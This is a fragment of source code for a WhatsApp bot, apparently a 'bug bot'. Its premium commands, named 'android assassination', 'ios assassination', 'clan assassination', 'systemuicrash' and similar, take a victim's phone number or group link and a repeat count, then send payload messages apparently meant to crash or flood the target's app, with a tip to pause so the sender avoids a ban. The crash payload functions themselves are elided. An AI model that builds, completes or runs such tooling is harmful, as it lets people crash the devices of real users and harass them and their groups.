...
const xtime = moment.tz('Africa/Accra').format('HH:mm:ss')
        ...
        const time2 = moment().tz('Africa/Accra').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `May the darkness conceal your exit`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `May the shadows be your ally`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `May your enemies not see you coming`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `May your footsteps be silent and your impact be loud`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good morning,may your targets be few and your success be many`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Rise and strike`
 } 
...
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
        ...
        if (autobio) {
            XeonBotInc.updateProfileStatus(`24/7 Online Bot By TechTitan27 and deployed by ${ownername}`).catch(_ => _)
        }
...
senddocu(buffer)
    ...
    case 'autostatusview':{
            ...
            case 'leave':
                ...
                replygcxeon('Bye Fellow Assassins ðŸ¥º')
                ...
                XeonBotInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://i.ibb.co/BKHJnJm/Thumb.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                ...
                XeonBotInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @TechTitan27`,
                            thumbnailUrl: 'https://i.ibb.co/BKHJnJm/Thumb.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
...
//bug cases
case "android assassination": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`To use ${prefix+command} nomor korban|jumlah\nContoh ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`To use ${prefix+command} nomor korban|jumlah\nContoh ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  ...
  if (cleanedNumber == "233257938281") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("Target is not on WhatsApp");
  }
  replygcxeon("Hold on, "+command+" Assassination in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Assassinated@" + whatsappNumber.split('@')[0] + 
    " Done*" + command + "* âœ…\n\nPause 2 munites to prevent a ban.", 
    [whatsappNumber]
  );
}
break;
case "ios assassination": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`To use ${prefix+command} nomor korban|jumlah\nContoh ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  ...
  replygcxeon("Hold, "+command+" Assassinationinprocess..");
  await sleep(2000); // Adjusted sleep time for clarity
...
break;
case "ios assassination2":
  {
	if (!isPremium) return replygcxeon(mess.prem)
    if (!isBot) {
      return replygcxeon("*This feature is only for assassins!*");
    }
    if (!text){
    ...
    replygcxeon("Hold, "+command+" Assassination in process..");
  ...
  break;
  case "android assassination2":
  {
	if (!isPremium) return replygcxeon(mess.prem)
    if (!isBot) {
      return replygcxeon("*This feature can only be used by assassins!*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
  ...
  case "clan assassination":
  {
    ...
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcxeon("clan doesn't exist!");
    }
    ...
    try {
      ...
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*DONEâœ… CLAN HAS BEEN ASSASSINATED SUCCESSFULLY!.*");
...
break
            ...
            case '?':
            case 'allmenu':
                let xeonmenuoh = `Halo kak ${pushname}
┏━━━━━⊱ ${xeonytimewisher} ━━━━⊱
> ${readmore}
━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
> android assassination 
> android assassination2 
> systemuicrash
> xsysui
━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
> ios assassination 
